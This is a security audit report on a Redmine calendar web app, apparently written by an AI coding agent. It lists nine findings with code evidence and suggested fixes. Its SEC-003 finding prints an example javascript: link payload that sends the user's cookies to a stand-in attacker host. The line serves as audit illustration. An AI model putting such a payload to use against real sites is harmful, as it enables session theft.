# Security Review: RedmineCalendar — 2026-05-30

Reviewed branch: `claude/redminecalendar-security-review-QKpCf`  
Reviewer: Claude Code (automated, all findings manually verified against source)

---

## Executive Summary

RedmineCalendar is a vanilla-JS SPA that connects to a Redmine REST API and optionally to
Claude/OpenAI via a developer-run CORS proxy. The cryptographic credential storage
(AES-GCM-256 with non-exportable IndexedDB keys) is sound. DOMPurify is applied
correctly and the proxy correctly strips client-supplied auth headers before injecting
the server-side AI API key.

Two high-severity gaps require remediation before broader deployment:

- **All five CDN scripts lack Subresource Integrity (SRI) attributes.** A compromised
  CDN delivery or a network MITM can silently replace DOMPurify, marked, FullCalendar,
  or MSAL with attacker-controlled code.
- **The dev proxy's CORS check is bypassable** by any non-browser HTTP client on the
  same host or LAN, exposing both the Redmine proxy (which carries the user's API key)
  and the AI proxy (which forwards to Anthropic/OpenAI with the company key) to
  unauthenticated callers.

Two medium-severity gaps also need attention:

- The custom docs markdown renderer constructs bare `<a href>` tags without filtering
  `javascript:` scheme URLs.
- Clickjacking protection (`frame-ancestors`) is absent; it cannot be set via a
  `<meta>` CSP tag and must be a server-side HTTP header.

---

## Findings

### SEC-001 — HIGH: No Subresource Integrity on CDN Scripts

**File**: `index.html:70-74`  
**Evidence**:

```html
<script src="https://cdn.jsdelivr.net/npm/marked@15.0.7/marked.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.7/dist/purify.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/fullcalendar@6.1.20/index.global.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@fullcalendar/core@6.1.20/locales-all.global.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@azure/msal-browser@2.39.0/lib/msal-browser.min.js"></script>
```

None of the five CDN-loaded scripts carry an `integrity` attribute.

**Impact**: A compromised CDN, a BGP hijack, or a passive MITM on an HTTP(S) path can
silently serve a backdoored version of any of these libraries. Replacing DOMPurify
alone would bypass all sanitization throughout the app. Replacing MSAL would intercept
Microsoft tokens. Browser SRI enforcement prevents this entirely.

**Remediation**: Add `integrity="sha384-<hash>"` and `crossorigin="anonymous"` to every
CDN `<script>`. Compute hashes with:

```sh
curl -sL <cdn-url> | openssl dgst -sha384 -binary | openssl base64 -A
```

Add a CI step (or a pre-commit hook) that re-checks hashes whenever CDN versions are
bumped in `index.html`. The same treatment should be applied to `settings.html` if it
loads any CDN scripts.

---

### SEC-002 — HIGH: Dev Proxy CORS Bypass via Missing `Origin` Header

**File**: `scripts/dev-server.mjs:83-104`  
**Evidence**:

```js
function devCorsOrigin(origin) {
  if (!origin) return null; // ← no-Origin request → null (not rejected)
  return LOOPBACK_ORIGIN_RE.test(origin) || PRIVATE_ORIGIN_RE.test(origin) ? origin : null;
}

// In the handler:
const origin = req.headers['origin'];
const allowedOrigin = devCorsOrigin(origin);

if (origin && !allowedOrigin) {
  // ← guard skipped entirely when origin is absent
  res.writeHead(403);
  return;
}
```

Browsers always send an `Origin` header for cross-origin requests, so the CORS check
correctly blocks browsers on public origins. However, non-browser HTTP clients (`curl`,
`python-requests`, `wget`, any script) never send `Origin`. Such a request reaches the
`if (origin && !allowedOrigin)` guard with `origin = undefined`, the condition is
`false`, and the request is forwarded with no further checks.

Both proxies are affected:

- Port 8010 (Redmine): forwards the user's `X-Redmine-API-Key` to Redmine.
- Port 8011 (AI): injects the company `AI_API_KEY` and forwards to Anthropic/OpenAI.

Because the server also binds to `0.0.0.0` (line 151), any machine on the same LAN
can reach both proxies with a direct HTTP call and consume the API keys or read Redmine
data without any credentials of their own.

**Remediation**: Require an explicit allow-list check regardless of whether `Origin` is
present. The simplest correct fix:

```js
function devCorsOrigin(origin) {
  if (!origin) return null;
  return LOOPBACK_ORIGIN_RE.test(origin) || PRIVATE_ORIGIN_RE.test(origin) ? origin : null;
}

// In the handler — replace the current guard:
const allowedOrigin = devCorsOrigin(origin);
if (!allowedOrigin) {
  res.writeHead(403);
  res.end('Dev proxy: only loopback/private-network origins are permitted.');
  return;
}
```

This rejects all requests that either lack `Origin` or carry a non-private one, while
still allowing `localhost` browser tabs and other LAN development machines to opt in
explicitly. Change the `listen` call from `'0.0.0.0'` to `'127.0.0.1'` unless LAN
access from other machines is intentionally required.

---

### SEC-003 — MEDIUM: `javascript:` URL Injection in Custom Docs Markdown Renderer

**File**: `js/docs.js:22-27`  
**Evidence**:

```js
function inlineMarkdown(text) {
  return text
    .replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2">$1</a>') // $2 is unsanitized
    .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>');
  // …
}
```

The link replacement captures `$2` (the URL portion of `[text](url)` syntax) and inserts
it verbatim into an `href` attribute. A `javascript:` URL (e.g.,
`[Click me](javascript:fetch('https://attacker.example/steal?k='+encodeURIComponent(document.cookie)))`)
in a docs file would execute JavaScript when the user clicks the link.

The docs are currently served as static local files (`docs/content.en.md`,
`docs/content.de.md`), so exploitation requires server write access or a supply-chain
compromise of those files. Nevertheless, defense-in-depth dictates filtering here.

**Remediation**: Strip non-`http(s)` and non-`#` schemes before emitting the anchor:

```js
function safeHref(url) {
  return /^(https?:\/\/|#)/.test(url) ? url : '#';
}

.replace(/\[([^\]]+)\]\(([^)]+)\)/g, (_, text, url) => `<a href="${safeHref(url)}">${text}</a>`)
```

Alternatively, use the already-loaded DOMPurify to sanitize the final rendered HTML
before assigning to `body.innerHTML` (docs.js:155, 164):

```js
body.innerHTML = DOMPurify.sanitize(_renderedCache[_docLocale]);
```

---

### SEC-004 — MEDIUM: Clickjacking — `frame-ancestors` Not Set

**File**: `index.html:12-14`, `settings.html` (same pattern)  
**Evidence**:

```html
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src …; … object-src 'none'; base-uri 'self';"
/>
```

`frame-ancestors` is absent. Per the CSP specification, `frame-ancestors` directives
are **ignored in `<meta>` CSP tags** — they are only honoured when delivered as an HTTP
response header. The comment in `index.html` mentions that `connect-src` is handled
server-side, but does not mention `frame-ancestors`.

An attacker can embed the calendar page in an invisible iframe on a third-party site and
use click-jacking to trick a logged-in user into creating, modifying, or deleting time
entries.

**Remediation**: Add to every server response:

```
Content-Security-Policy: frame-ancestors 'none';
```

Or, if embedding by certain trusted partners is required:

```
Content-Security-Policy: frame-ancestors 'self' https://intranet.example.com;
```

Document this in `README.md` next to the existing `connect-src` guidance.

---

### SEC-005 — MEDIUM: Chatbot Tool Inputs Pass to API Without Format Validation

**File**: `js/chatbot-tools.js:182-224`  
**Evidence**:

```js
export async function executeTool(name, input) {
  switch (name) {
    case 'query_time_entries':
      return await executeQuery(input); // input from AI, not validated
    // …
  }
}

async function executeQuery({ from, to, issue_id }) {
  const rawEntries = await fetchTimeEntries(from, to); // dates passed directly
  // …
}
```

The `from` and `to` fields are passed directly to `fetchTimeEntries()` → `request()` →
`fetch()` as URL query parameters with no `YYYY-MM-DD` format check. An AI model
returning a malformed date (e.g., `../../etc/passwd` or an empty string) will produce a
malformed Redmine API URL. This is low probability with current well-behaved models but
becomes a relevant attack surface if the AI provider is compromised or if a prompt
injection attack manipulates the model's tool responses.

**Remediation**: Add lightweight guards at the top of each tool executor:

```js
const DATE_RE = /^\d{4}-\d{2}-\d{2}$/;

async function executeQuery({ from, to, issue_id }) {
  if (!DATE_RE.test(from) || !DATE_RE.test(to)) {
    return { result: 'Invalid date format — expected YYYY-MM-DD.' };
  }
  if (issue_id !== undefined && (!Number.isInteger(issue_id) || issue_id <= 0)) {
    return { result: 'Invalid issue_id.' };
  }
  // …proceed…
}
```

Apply equivalent guards in `executeCreate`, `executeEdit`, `executeDelete`, and
`executeBookOutlookDay`.

---

### SEC-006 — LOW: Source Code Files Sent to External AI API with Partial Redaction

**File**: `js/knowledge.js:46-131`  
**Evidence**:

```js
async function loadSourceFile(path) {
  // …
  text = text.replace(/apiKey\s*[:=]\s*['"][^'"]+['"]/gi, 'apiKey: "[REDACTED]"');
  text = text.replace(/password\s*[:=]\s*['"][^'"]+['"]/gi, 'password: "[REDACTED]"');
  // …other patterns not redacted
}
```

When the chatbot receives a query matching a topic keyword, the relevant source files are
appended to the system prompt and sent to the AI provider (Anthropic or OpenAI). Two
credential patterns are redacted, but others are not: `token`, `api_key`, `apikey`,
`secret`, `X-Redmine-API-Key`, etc.

In practice the Redmine API key never appears in source files (it is encrypted in
localStorage), and the AI API key is injected server-side and never reaches the browser.
The real risk is organisational: sending internal source code to a third-party AI
provider may violate data-handling policies.

**Remediation**:

1. Expand the redaction regex to cover common additional patterns:
   ```js
   const SENSITIVE_RE =
     /\b(apiKey|api_key|apikey|password|token|secret|auth|credential)(\s*[:=]\s*)(['"][^'"]*['"])/gi;
   text = text.replace(SENSITIVE_RE, '$1$2"[REDACTED]"');
   ```
2. Consider an explicit allowlist of source files that may be sent to the AI, rather
   than the current keyword-driven inclusion of any matching file.
3. Document the data-sharing behaviour in the README / privacy section.

---

### SEC-007 — LOW: Console Telemetry Leaks System Prompt Size in Production

**File**: `js/knowledge.js:127-129`  
**Evidence**:

```js
console.info(
  `[knowledge] Prompt size: ${(prompt.length / 1024).toFixed(1)}KB (${relevantSource?.size ?? 0} source files)`
);
```

This runs in every chatbot interaction in production. While the data itself (prompt KB,
file count) is not sensitive, it enables passive reconnaissance of the AI feature's
internals from the browser DevTools console. It also pollutes production logs.

**Remediation**: Gate behind a development flag or remove entirely:

```js
if (typeof process !== 'undefined' && process.env.NODE_ENV !== 'production') {
  console.info(`[knowledge] Prompt size: …`);
}
```

---

### SEC-008 — LOW: Proxy URL Surfaces in User-Facing Error Messages

**File**: `js/redmine-api.js:78-80`, `js/chatbot-api.js:45-51`  
**Evidence**:

```js
// redmine-api.js
const proxyUrl = httpsOrigin(redmineUrl);
const err = new RedmineError(t('error.network', { proxyUrl }), 0);
err.proxyUrl = proxyUrl;

// chatbot-api.js
const proxyUrl = httpsOrigin(aiProxyUrl);
const err = new Error(t('chatbot.error_proxy', { proxyUrl }));
err.proxyUrl = proxyUrl;
```

Network error toasts include the proxy URL (e.g., `https://redmine.company.internal/`)
visible in the UI. This is a low-risk information disclosure — the URL is already known
to the user who configured it — but it enables an attacker observing a shared screen or
screenshot to learn internal infrastructure hostnames.

**Remediation**: Keep `proxyUrl` on the error object for the settings-page link (which
needs it), but strip it from the toast message text. Change the i18n string for
`error.network` to a generic "Cannot reach Redmine." and reserve the URL for the
"Go to Settings" anchor only.

---

### SEC-009 — LOW: Voice Privacy Consent Lacks Revocation Path

**File**: `js/voice-input.js:3,15-20`  
**Evidence**:

```js
const PRIVACY_KEY = 'redmine_calendar_voice_privacy_dismissed';

export function dismissPrivacy() {
  localStorage.setItem(PRIVACY_KEY, 'true');
}
```

Once dismissed, the voice privacy notice never reappears and there is no in-app option
to revoke consent. Under GDPR the user must be able to withdraw consent as easily as
they gave it.

**Remediation**: Add a "Reset voice consent" toggle in the Settings page that calls
`localStorage.removeItem(PRIVACY_KEY)`.

---

## Confirmed Good Practices

The following patterns were audited and are correctly implemented:

| Area                                 | Finding                                                                                                                                                                                                                                                                                                       |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Credential encryption**            | AES-GCM-256 with `extractable: false` IndexedDB key; fresh random 12-byte IV per encrypt call (`crypto.js:64`). Correct.                                                                                                                                                                                      |
| **DOMPurify usage**                  | `renderMessage()` applies `DOMPurify.sanitize(html)` before `innerHTML`. The `renderText()` → `marked.parse()` → `renderMessage()` chain is the recommended order (sanitize the HTML output from the markdown parser). `canRenderMarkdown()` falls back to `textContent` when the CDN scripts haven't loaded. |
| **AI API key never reaches browser** | The dev proxy strips client-supplied `x-api-key`/`authorization` headers and injects the server-side `AI_API_KEY` (`dev-server.mjs:66-71`). Config.json carries only `aiProxyUrl`, not the key itself.                                                                                                        |
| **CORS public-origin rejection**     | `devCorsOrigin()` blocks all non-private, non-loopback origins for browser requests.                                                                                                                                                                                                                          |
| **Path traversal guard**             | `serveStatic()` validates `filePath.startsWith(root)` after joining (`dev-server.mjs:188-193`).                                                                                                                                                                                                               |
| **Licenses page HTML escaping**      | `renderAttributionsTable()` uses a dedicated `escapeHtml()` on every field from `attributions.json` before HTML insertion (`licenses.js:17-66`).                                                                                                                                                              |
| **Anomaly badge innerHTML**          | The inline SVG is a hardcoded literal with no user data (`anomaly-render.js:34-39`).                                                                                                                                                                                                                          |
| **Toolbar innerHTML**                | Uses only output from `t()` (static JSON translation files), not user input (`calendar-toolbar.js:215-220`).                                                                                                                                                                                                  |
| **Retry + back-off**                 | Both the Redmine and AI fetch paths implement capped exponential back-off on 429/503 without tight spin loops.                                                                                                                                                                                                |

---

## Priority Remediation Order

| Priority | Finding                                                  | Effort                                                            |
| -------- | -------------------------------------------------------- | ----------------------------------------------------------------- |
| 1        | SEC-001 — Add SRI hashes to CDN scripts                  | Low (compute hashes, add attributes)                              |
| 2        | SEC-002 — Fix proxy CORS bypass for no-Origin requests   | Low (one-line guard change)                                       |
| 3        | SEC-003 — Filter `javascript:` in docs markdown renderer | Low (add `safeHref()` helper or run DOMPurify on rendered output) |
| 4        | SEC-004 — Add `frame-ancestors` server-side header       | Low (nginx/Apache config)                                         |
| 5        | SEC-005 — Validate chatbot tool inputs                   | Medium (guards in 5 executor functions)                           |
| 6        | SEC-006 — Expand credential redaction in knowledge.js    | Low (one regex change)                                            |
| 7        | SEC-007 — Remove prod console.info from knowledge.js     | Trivial                                                           |
| 8        | SEC-008 — Remove URL from toast error message            | Low (i18n string + caller change)                                 |
| 9        | SEC-009 — Add voice consent revocation in Settings       | Low (one localStorage.removeItem + UI toggle)                     |
